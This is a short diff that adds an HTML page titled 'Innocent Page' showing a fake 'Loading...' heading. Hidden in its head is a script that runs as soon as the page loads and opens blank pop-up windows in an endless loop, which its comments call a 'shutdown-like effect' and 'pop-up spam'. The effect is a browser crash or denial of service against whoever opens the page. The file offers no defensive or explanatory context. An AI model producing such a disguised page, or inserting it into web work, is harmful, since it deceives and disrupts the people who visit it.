@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Page</title>
+    <script>
+        // Shutdown-like effect (infinite loop)
+        function crash() {
+            while (true) {
+                window.open("about:blank"); // Pop-up spam
+            }
+        }
+        crash(); // Auto-run
+    </script>
+</head>
+<body>
+    <h1>Loading... (Fake)</h1>
+</body>
+</html>
